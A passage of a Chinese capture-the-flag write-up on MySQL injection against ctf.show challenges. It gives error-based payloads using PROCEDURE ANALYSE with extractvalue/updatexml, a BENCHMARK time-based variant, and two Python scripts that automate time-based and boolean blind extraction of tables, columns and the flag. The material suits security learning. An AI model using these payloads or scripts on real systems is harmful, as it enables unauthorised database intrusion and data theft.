<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mysql&gt; SELECT field FROM table where id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE ANALYSE(1,1); </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ERROR 1386 (HY000): Can&#x27;t use ORDER clause with this procedure</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>看起来并不是很好，继续尝试：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mysql&gt; SELECT field from table where id &gt; 0 order by id LIMIT 1,1 procedure analyse((select IF(MID(version(),1,1) LIKE 5, sleep(5),1)),1);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>但是立即返回了一个错误信息：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ERROR 1108 (HY000): Incorrect parameters to procedure &#x27;analyse&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>sleep函数肯定没有执行，但是最终我还是找到了可以攻击的方式：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ERROR 1105 (HY000): XPATH syntax error: &#x27;:5.5.41-0ubuntu0.14.04.1&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>如果不支持报错注入的话，还可以基于时间注入：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>直接使用sleep不行，需要用BENCHMARK代替。</p>
<p>首先看一下传的参数</p>
<p>GET <a href="http://47e30f87-1f8b-4cca-a35f-b4d1aa4049d5.challenge.ctf.show/api/?id=1&amp;page=1&amp;limit=10" target="_blank" rel="noopener noreferrer">http://47e30f87-1f8b-4cca-a35f-b4d1aa4049d5.challenge.ctf.show/api/?id=1&amp;page=1&amp;limit=10</a></p>
<p>然后注意看上面的攻击方式</p>
<div class="language-mysql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-mysql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ERROR 1105 (HY000): XPATH syntax error: &#x27;:5.5.41-0ubuntu0.14.04.1&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>用这个语句，成功注入出了version()，因为这里开启了报错</p>
<p>这道题也开启了报错，所以也能用这个payload打，试试</p>
<p><img decoding="async" loading="lazy" alt="image-20220111124417390" src="/assets/images/image-20220111124417390-f72841908ca807be35ca4fd84ec3ca1f.png" width="1327" height="179" class="img_ev3q"></p>
<p>没毛病吧，那就把version()换成database()</p>
<p>得到：<code>{&quot;code&quot;:0,&quot;msg&quot;:&quot;\u67e5\u8be2\u5931\u8d25XPATH syntax error: &#x27;:ctfshow_web_flag_x&#x27;&quot;,&quot;count&quot;:&quot;0&quot;,&quot;data&quot;:[]}</code></p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">url/api/index.php?page=1&amp;limit=1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>当然，既然是报错注入，除了extractvalue，还能用updatexml</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">url/api/index.php?page=1&amp;limit=1 procedure analyse(updatexml(rand(),concat(0x3a,database()),1),1);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>所以这题flag就是ctfshow_web_flag_x，不需要包裹ctfshow</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web222">web222<a href="#web222" class="hash-link" aria-label="Direct link to web222" title="Direct link to web222">​</a></h3>
<p>group 注入</p>
<p>查询语句</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  //分页查询</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  $sql = select * from ctfshow_user group by $username;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>返回逻辑</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//TODO:很安全，不需要过滤</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这里已经写死group by $username了</p>
<p>百度看了一下，group by和报错注入有点关系</p>
<p>然后发现，在使用floor的时候会出现报错的情况，可以看这两篇文章</p>
<p><a href="https://www.secpulse.com/archives/140616.html" target="_blank" rel="noopener noreferrer">https://www.secpulse.com/archives/140616.html</a></p>
<p><a href="https://www.cnblogs.com/xdans/p/5412468.html" target="_blank" rel="noopener noreferrer">https://www.cnblogs.com/xdans/p/5412468.html</a></p>
<p>好了，回到这道题，他会依次去扫描我们$username。也就是说，这题是一共给了21个id，如果我们传的是这个表，那么他会一行一行去扫这21个id。</p>
<p>那如果我们写入语句：1,if(1=1,sleep(0.1),1)   正常来说，他就会停顿2.1s以上</p>
<p>所以能够利用这个特点，实现一波时间盲注</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> time</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">url</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;http://9f4a1dc4-86c8-4876-b732-f5ffd6be8114.challenge.ctf.show/api/index.php?u=&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">100</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin">min</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">32</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin">max</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">128</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        j</span><span class="token operator" style="color:#393A34">=</span><span class="token builtin">min</span><span class="token operator" style="color:#393A34">+</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">max</span><span class="token operator" style="color:#393A34">-</span><span class="token builtin">min</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">//</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token builtin">min</span><span class="token operator" style="color:#393A34">==</span><span class="token plain">j</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            flag</span><span class="token operator" style="color:#393A34">+=</span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">j</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">break</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic">#payload=f&quot;1,if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))&lt;{j},sleep(0.02),1)&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic">#payload=f&quot;1,if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flaga&#x27;),{i},1))&lt;{j},sleep(0.02),1)&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payload</span><span class="token operator" style="color:#393A34">=</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;1,if(ascii(substr((select group_concat(flagaabc) from ctfshow_flaga),</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">i</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,1))&lt;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">j</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,sleep(0.02),1)&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">try</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            r</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">get</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">url</span><span class="token operator" style="color:#393A34">+</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">timeout</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">0.4</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token builtin">min</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">except</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token builtin">max</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        time</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sleep</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0.2</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后这里我试了一下concat(database(),floor(rand(0)*30))</p>
<p><img decoding="async" loading="lazy" alt="image-20220111130735779" src="/assets/images/image-20220111130735779-f7a85280786b99f7573aee58ec2dd701.png" width="1775" height="300" class="img_ev3q"></p>
<p>能查询出来东西，是不是可以用布尔盲注呢。况且布尔比时间快</p>
<p>最后发现也是可行的，脚本如下</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> time</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">url</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;http://60eb33c3-f99f-40ab-a612-d0085affb66a.challenge.ctf.show/api/index.php?u=&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">100</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin">min</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">32</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin">max</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">128</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        j</span><span class="token operator" style="color:#393A34">=</span><span class="token builtin">min</span><span class="token operator" style="color:#393A34">+</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">max</span><span class="token operator" style="color:#393A34">-</span><span class="token builtin">min</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">//</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token builtin">min</span><span class="token operator" style="color:#393A34">==</span><span class="token plain">j</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            flag</span><span class="token operator" style="color:#393A34">+=</span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">j</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">break</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic">#payload=f&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))&lt;{j},username,id)&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic">#payload=f&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flaga&#x27;),{i},1))&lt;{j},username,id)&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payload</span><span class="token operator" style="color:#393A34">=</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;if(ascii(substr((select group_concat(flagaabc) from ctfshow_flaga),</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">i</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,1))&lt;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">j</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,username,id)&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        r</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">get</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">url</span><span class="token operator" style="color:#393A34">+</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic">#print(r.text)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">r</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token number" style="color:#36acaa">288</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token builtin">max</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">else</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token builtin">min</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">j</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
